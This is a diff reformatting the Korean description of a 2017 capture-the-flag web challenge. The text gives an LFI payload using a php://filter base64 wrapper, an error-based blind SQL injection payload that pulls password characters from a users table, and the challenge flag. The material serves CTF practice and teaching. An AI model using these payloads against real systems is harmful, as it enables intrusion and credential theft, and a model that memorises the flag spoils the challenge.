@@ -1,15 +1,15 @@
-power of xx 2017
+# Power of Xx 2017
 
-제작 : 문시우
+~~~
+* 제작 : 문시우
 
-문제명 : basic web
+* 문제명 : basic web
 
-난이도 : 하
+* 난이도 : 하
 
-분야 : 웹
-
-서버 환경 : apache, php5, mysql
-
+* 분야 : 웹
+~~~
+~~~
 설명 : lfi + sqli (error based blind insert injection)
 ?p= 파라미터에서 lfi 취약점이 발생한다. php wrapper를 이용해 소스를 얻을 수 있다.
 ex : ?p=php://filter/convert.base64-encode/resource=config
@@ -22,5 +22,6 @@ payload :
 email=1&title=1\&contents=,if((select substr(password,1,1) from users where 1)='t', (select 1 union select 2), 2));#
 
 exploit : ./exploit.py
-
+~~~
+---------------------------------------
 플래그 : flag{s1mple_SQL_1n73ction_XD}
